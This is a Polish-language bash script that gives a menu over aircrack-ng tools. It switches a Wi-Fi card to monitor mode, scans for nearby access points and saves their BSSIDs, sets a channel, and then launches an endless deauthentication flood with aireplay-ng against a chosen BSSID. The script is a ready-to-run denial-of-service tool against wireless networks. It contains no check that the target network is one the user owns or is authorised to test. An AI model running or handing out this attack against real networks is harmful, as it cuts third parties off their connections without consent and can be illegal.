#!/bin/bash

# Pobranie nazwy aktywnego interfejsu sieciowego
interfaceName=$(ip link | grep -Eo '^[0-9]+: wl[^:]+:' | awk -F': ' '{print $2}' | tr -d ':')
interfaceName=$(echo $interfaceName | xargs)  # Usunięcie białych znaków

press_to_continue() {
    echo "Naciśnij dowolny klawisz, aby kontynuować..."
    read -n 1 -s -r
    echo
}

# Petla do while, celem poprawy dzialania skryptu.
while true; do
    clear
# Menu wyboru
    echo
    echo "=========================================================================================="
    echo "1) Przechwyc BSSID."
    echo "2) Wybierz kanal."
    echo "3) Atak deauth."
    echo "0) Zakoncz działanie programu."
    echo "=========================================================================================="
    echo "------------------------------------------------------------------------------------------"
    read -p "Wybierz opcję: " choice
    echo
    echo

case $choice in
    1)  # Uruchomienie programu
    	clear
        sudo airmon-ng start $interfaceName
        echo; echo;
     	echo "airmon-ng start $interfaceName .. "
     	echo "airmon-ng start ${interfaceName}mon ..."
     	echo; echo;
     	
        # Uruchomienie airodump-ng przez 5 sekund i zapisanie wyniku do pliku txt
        sudo timeout 5 airodump-ng "${interfaceName}mon" > airodump.txt
        #grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' airodump.txt | sort | uniq > bssid.txt
        
	grep -E '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' airodump.txt | awk '$6 ~ /^[1-9][0-9]*$/ && $11 !~ /^</ {print $1, $6, $11}' | sort | uniq > bssid.txt

        rm airodump.txt
	echo "=========================================================================================="
	cat bssid.txt
	echo "=========================================================================================="
        echo
        press_to_continue
        ;;

     2)
        # Wybierz kanal
        clear
        echo "Wpisz numer kanału, na którym chcesz przeprowadzić atak deauth:"
	read chosenChannel
	sudo iw "${interfaceName}mon" set channel $chosenChannel
	echo "Kanal $chosenChannel zostal wybrany"
	press_to_continue
	;;
    3)
	# Atak deauth
        clear
        echo "=========================================================================================="
	cat bssid.txt
	echo "=========================================================================================="
	echo
        echo "Podaj BSSID, na którym chcesz przeprowadzić atak deauth:"
	read chosenBSSID
	echo "Wybrano BSSID: $chosenBSSID"
	sudo aireplay-ng --deauth 0 -a $chosenBSSID ${interfaceName}mon
	press_to_continue
	;;
        
    0)
        # Wyjście ze skryptu
        sudo airmon-ng stop "${interfaceName}mon"
        rm bssid.txt
        sudo systemctl restart NetworkManager   
        echo "Wyjście."
        break
        ;;
    
    *)
        # Restart skryptu w przypadku wybrania zlej wartosci
        echo "Nieprawidłowy wybór. Wybierz jeszcze raz, badz wybierz '0' aby wyjsc!."
        press_to_continue
        ;;
    esac
done
